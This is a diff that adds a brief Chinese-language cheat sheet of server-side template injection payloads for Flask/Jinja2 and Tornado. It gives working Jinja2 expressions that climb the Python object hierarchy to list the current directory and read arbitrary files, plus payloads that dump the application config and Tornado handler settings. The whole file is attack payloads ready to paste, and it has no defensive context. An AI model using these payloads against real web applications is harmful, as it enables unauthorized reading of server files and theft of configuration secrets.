@@ -1,0 +1,14 @@
+查询当前目录
+flask框架
+{{''.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__['os'].listdir('./')}}
+打开文件
+{{''.__class__.__mro__[-1].__subclasses__()[40]('filename').read()}}
+查看配置
+{{config}}
+内置函数
+url_for
+get_flashed_messages
+
+tornado框架
+查看配置
+{{handler.settings}}
